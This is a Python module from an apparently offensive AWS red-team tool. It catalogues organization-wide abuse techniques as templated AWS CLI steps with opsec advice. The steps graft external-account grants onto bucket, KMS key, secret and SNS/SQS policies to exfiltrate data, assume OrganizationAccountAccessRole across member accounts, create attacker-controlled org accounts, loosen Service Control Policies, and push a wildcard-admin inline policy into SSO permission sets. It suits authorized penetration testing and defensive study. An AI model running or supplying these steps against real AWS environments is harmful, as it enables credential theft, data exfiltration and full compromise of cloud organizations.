"""Organization / cross-account / external-exposure edges: resource-policy
sharing to external accounts, cross-account role assumption, AWS Organizations
abuse, and IAM Identity Center (SSO) assignment.

This is where a single-account compromise becomes an organization-wide one - the
cloud analogue of ADPwn's cross-forest trust and DCSync-at-the-root edges.
"""

from ..models import AbuseInfo, AbuseStep, BlastRadius, Platform

ABUSE_DB: dict[str, AbuseInfo] = {}


def _s(desc, cmd, api="", blast=BlastRadius.READ, tool="aws", opsec="") -> AbuseStep:
    return AbuseStep(
        description=desc,
        command=cmd,
        platform=Platform.LINUX,
        tool=tool,
        blast_radius=blast,
        api=api,
        opsec_note=opsec,
    )


# ─── S3BucketPolicyExposeExternal ───────────────────────────────────────────

ABUSE_DB["S3BucketPolicyExposeExternal"] = AbuseInfo(
    edge_kind="S3BucketPolicyExposeExternal",
    description=(
        "s3:PutBucketPolicy grafts a statement onto a bucket policy granting an "
        "external account (yours) read/write. Exfiltrate or tamper with the "
        "bucket's contents from outside the target - endgame-style resource "
        "exposure."
    ),
    required_permissions=["s3:PutBucketPolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["S3Bucket"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations=(
        "PutBucketPolicy OVERWRITES the entire policy - merge your statement "
        "into the existing document and keep the original for rollback. Access "
        "Analyzer flags external grants. Requires --allow-external."
    ),
    linux_steps=[
        _s(
            "Capture the current bucket policy",
            "aws s3api get-bucket-policy {AWS_AUTH} --bucket '{BUCKET}' --query Policy --output text",
            api="s3:GetBucketPolicy",
            blast=BlastRadius.READ,
        ),
        _s(
            "Write a merged policy granting your account access",
            "aws s3api put-bucket-policy {AWS_AUTH} --bucket '{BUCKET}' --policy '{MERGED_BUCKET_POLICY}'",
            api="s3:PutBucketPolicy",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
        AbuseStep(
            description="Cleanup: restore the original bucket policy",
            command="aws s3api put-bucket-policy {AWS_AUTH} --bucket '{BUCKET}' --policy '{ORIGINAL_BUCKET_POLICY}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
            api="s3:PutBucketPolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── KMSKeyPolicyExposeExternal ─────────────────────────────────────────────

ABUSE_DB["KMSKeyPolicyExposeExternal"] = AbuseInfo(
    edge_kind="KMSKeyPolicyExposeExternal",
    description=(
        "kms:PutKeyPolicy adds your external account to a CMK's key policy, "
        "letting you decrypt everything protected by that key from outside - "
        "secrets, encrypted S3 objects, parameters."
    ),
    required_permissions=["kms:PutKeyPolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["KMSKey"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations=(
        "The default key policy must not lock you out. PutKeyPolicy OVERWRITES; "
        "removing the account root statement can make the key unmanageable - "
        "always merge and keep the original."
    ),
    linux_steps=[
        _s(
            "Capture the current key policy",
            "aws kms get-key-policy {AWS_AUTH} --key-id '{KEY_ID}' --policy-name default --query Policy --output text",
            api="kms:GetKeyPolicy",
            blast=BlastRadius.READ,
        ),
        _s(
            "Write a merged key policy granting your account kms:Decrypt",
            "aws kms put-key-policy {AWS_AUTH} --key-id '{KEY_ID}' --policy-name default --policy '{MERGED_KEY_POLICY}'",
            api="kms:PutKeyPolicy",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
        AbuseStep(
            description="Cleanup: restore the original key policy",
            command="aws kms put-key-policy {AWS_AUTH} --key-id '{KEY_ID}' --policy-name default --policy '{ORIGINAL_KEY_POLICY}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
            api="kms:PutKeyPolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── SecretPolicyExposeExternal ─────────────────────────────────────────────

ABUSE_DB["SecretPolicyExposeExternal"] = AbuseInfo(
    edge_kind="SecretPolicyExposeExternal",
    description=(
        "secretsmanager:PutResourcePolicy grants your external account "
        "GetSecretValue on a secret, exfiltrating credential material across "
        "the account boundary."
    ),
    required_permissions=["secretsmanager:PutResourcePolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["Secret"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations="KMS-encrypted secrets also need the key policy to allow your account (see KMSKeyPolicyExposeExternal).",
    linux_steps=[
        _s(
            "Attach a resource policy allowing your account to read the secret",
            "aws secretsmanager put-resource-policy {AWS_AUTH} \\\n"
            "  --secret-id '{SECRET_ID}' \\\n"
            "  --resource-policy '{EXTERNAL_SECRET_POLICY}'",
            api="secretsmanager:PutResourcePolicy",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
        AbuseStep(
            description="Cleanup: delete the resource policy",
            command="aws secretsmanager delete-resource-policy {AWS_AUTH} --secret-id '{SECRET_ID}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
            api="secretsmanager:DeleteResourcePolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── SNSSQSPolicyExposeExternal ─────────────────────────────────────────────

ABUSE_DB["SNSSQSPolicyExposeExternal"] = AbuseInfo(
    edge_kind="SNSSQSPolicyExposeExternal",
    description=(
        "sns:SetTopicAttributes / sqs:SetQueueAttributes rewrites a topic or "
        "queue policy to let your external account subscribe or receive - "
        "intercepting messages that may carry sensitive data or tokens."
    ),
    required_permissions=["sns:SetTopicAttributes", "sqs:SetQueueAttributes"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["AWSAccount"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations="Message interception is stealthy but the policy change is visible to Access Analyzer.",
    linux_steps=[
        _s(
            "Allow your account to subscribe to the topic",
            "aws sns set-topic-attributes {AWS_AUTH} \\\n"
            "  --topic-arn '{TOPIC_ARN}' --attribute-name Policy \\\n"
            "  --attribute-value '{MERGED_TOPIC_POLICY}'",
            api="sns:SetTopicAttributes",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
    ],
)


# ─── AssumeRoleCrossAccount (org pivot view) ────────────────────────────────

ABUSE_DB["AssumeRoleCrossAccountOrg"] = AbuseInfo(
    edge_kind="AssumeRoleCrossAccountOrg",
    description=(
        "Many organizations wire a standard cross-account access role (often "
        "named for a CI/CD or audit function) trusted by a central account. "
        "Compromising the central principal lets you fan out into every member "
        "account that trusts it."
    ),
    required_permissions=["sts:AssumeRole"],
    source_kinds=["IAMRole", "IAMUser"],
    target_kinds=["ExternalAccount"],
    blast_radius=BlastRadius.READ,
    opsec_considerations="Enumerate which member accounts trust your principal before spraying AssumeRole.",
    linux_steps=[
        _s(
            "Assume the cross-account role in a member account",
            "aws sts assume-role {AWS_AUTH} \\\n"
            "  --role-arn 'arn:aws:iam::{MEMBER_ACCOUNT}:role/{CROSS_ACCOUNT_ROLE}' \\\n"
            "  --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
        ),
    ],
)


# ─── OrgManagementAccountAccess ─────────────────────────────────────────────

ABUSE_DB["OrgManagementAccountAccess"] = AbuseInfo(
    edge_kind="OrgManagementAccountAccess",
    description=(
        "From the Organizations MANAGEMENT account you can assume "
        "OrganizationAccountAccessRole in ANY member account - that role is "
        "created with AdministratorAccess and trusts the management account by "
        "default. This is org-wide game over."
    ),
    required_permissions=["sts:AssumeRole", "organizations:ListAccounts"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["Organization"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Only works FROM the management account (or a delegated admin). "
        "Assuming OrganizationAccountAccessRole across dozens of accounts in "
        "quick succession is a strong anomaly signal."
    ),
    linux_steps=[
        _s(
            "List every account in the organization",
            "aws organizations list-accounts {AWS_AUTH} --query 'Accounts[].[Id,Name]' --output text",
            api="organizations:ListAccounts",
        ),
        _s(
            "Assume admin in a chosen member account",
            "aws sts assume-role {AWS_AUTH} \\\n"
            "  --role-arn 'arn:aws:iam::{MEMBER_ACCOUNT}:role/OrganizationAccountAccessRole' \\\n"
            "  --role-session-name '{SESSION_NAME}'",
            api="sts:AssumeRole",
        ),
    ],
)


# ─── CreateOrgAccount ───────────────────────────────────────────────────────

ABUSE_DB["CreateOrgAccount"] = AbuseInfo(
    edge_kind="CreateOrgAccount",
    description=(
        "organizations:CreateAccount spins up a new member account whose "
        "OrganizationAccountAccessRole trusts the management account - a fresh, "
        "attacker-controlled admin foothold inside the org."
    ),
    required_permissions=["organizations:CreateAccount"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["Organization"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="New accounts appear in the org and in billing. High-signal; rarely appropriate on an engagement.",
    linux_steps=[
        _s(
            "Create a new member account",
            "aws organizations create-account {AWS_AUTH} \\\n"
            "  --email '{ACCOUNT_EMAIL}' --account-name 'awspwn'",
            api="organizations:CreateAccount",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── WeakenSCP ──────────────────────────────────────────────────────────────

ABUSE_DB["WeakenSCP"] = AbuseInfo(
    edge_kind="WeakenSCP",
    description=(
        "organizations:UpdatePolicy / DetachPolicy modifies or removes a "
        "Service Control Policy, lifting an org-wide guardrail so actions "
        "previously denied everywhere become possible."
    ),
    required_permissions=["organizations:UpdatePolicy", "organizations:DetachPolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["ServiceControlPolicy"],
    blast_radius=BlastRadius.DESTRUCTIVE,
    opsec_considerations=(
        "Weakening an SCP removes a control that protects the WHOLE org - very "
        "high impact and high signal. Capture the original document; only touch "
        "SCPs with explicit authorization."
    ),
    linux_steps=[
        _s(
            "Capture the current SCP content",
            "aws organizations describe-policy {AWS_AUTH} --policy-id '{SCP_ID}' --query 'Policy.Content'",
            api="organizations:DescribePolicy",
            blast=BlastRadius.READ,
        ),
        _s(
            "Loosen the SCP",
            "aws organizations update-policy {AWS_AUTH} --policy-id '{SCP_ID}' --content '{NEW_SCP_CONTENT}'",
            api="organizations:UpdatePolicy",
            blast=BlastRadius.DESTRUCTIVE,
        ),
        AbuseStep(
            description="Cleanup: restore the original SCP content",
            command="aws organizations update-policy {AWS_AUTH} --policy-id '{SCP_ID}' --content '{ORIGINAL_SCP_CONTENT}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.DESTRUCTIVE,
            api="organizations:UpdatePolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── IdentityCenterAssign ───────────────────────────────────────────────────

ABUSE_DB["IdentityCenterAssign"] = AbuseInfo(
    edge_kind="IdentityCenterAssign",
    description=(
        "sso-admin:CreateAccountAssignment binds a user/group to a permission "
        "set in a target account through IAM Identity Center (SSO), granting "
        "that access org-wide via the SSO portal."
    ),
    required_permissions=["sso-admin:CreateAccountAssignment"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IdentityCenter"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Requires access to the Identity Center management/delegated-admin "
        "account. Assignments are visible in the SSO console and CloudTrail. "
        "Reversible with DeleteAccountAssignment."
    ),
    linux_steps=[
        _s(
            "Assign a permission set to your SSO principal in a target account",
            "aws sso-admin create-account-assignment {AWS_AUTH} \\\n"
            "  --instance-arn '{SSO_INSTANCE_ARN}' \\\n"
            "  --permission-set-arn '{PERMISSION_SET_ARN}' \\\n"
            "  --principal-type USER --principal-id '{PRINCIPAL_ID}' \\\n"
            "  --target-type AWS_ACCOUNT --target-id '{TARGET_ACCOUNT}'",
            api="sso-admin:CreateAccountAssignment",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: delete the account assignment",
            command="aws sso-admin delete-account-assignment {AWS_AUTH} --instance-arn '{SSO_INSTANCE_ARN}' --permission-set-arn '{PERMISSION_SET_ARN}' --principal-type USER --principal-id '{PRINCIPAL_ID}' --target-type AWS_ACCOUNT --target-id '{TARGET_ACCOUNT}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="sso-admin:DeleteAccountAssignment",
            is_cleanup=True,
        ),
    ],
)


# ─── IdentityCenterPermissionSetInline ──────────────────────────────────────

ABUSE_DB["IdentityCenterPermissionSetInline"] = AbuseInfo(
    edge_kind="IdentityCenterPermissionSetInline",
    description=(
        "sso-admin:PutInlinePolicyToPermissionSet (+ ProvisionPermissionSet) "
        "widens an existing permission set that is already assigned to you, "
        "escalating your SSO access without a new assignment."
    ),
    required_permissions=[
        "sso-admin:PutInlinePolicyToPermissionSet",
        "sso-admin:ProvisionPermissionSet",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["SSOPermissionSet"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Must re-provision the permission set for the change to take effect across assigned accounts.",
    linux_steps=[
        _s(
            "Add an admin inline policy to the permission set",
            "aws sso-admin put-inline-policy-to-permission-set {AWS_AUTH} \\\n"
            "  --instance-arn '{SSO_INSTANCE_ARN}' \\\n"
            "  --permission-set-arn '{PERMISSION_SET_ARN}' \\\n"
            '  --inline-policy \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
            api="sso-admin:PutInlinePolicyToPermissionSet",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Re-provision so the change lands in assigned accounts",
            "aws sso-admin provision-permission-set {AWS_AUTH} \\\n"
            "  --instance-arn '{SSO_INSTANCE_ARN}' \\\n"
            "  --permission-set-arn '{PERMISSION_SET_ARN}' \\\n"
            "  --target-type ALL_PROVISIONED_ACCOUNTS",
            api="sso-admin:ProvisionPermissionSet",
            blast=BlastRadius.MUTATE,
        ),
    ],
)
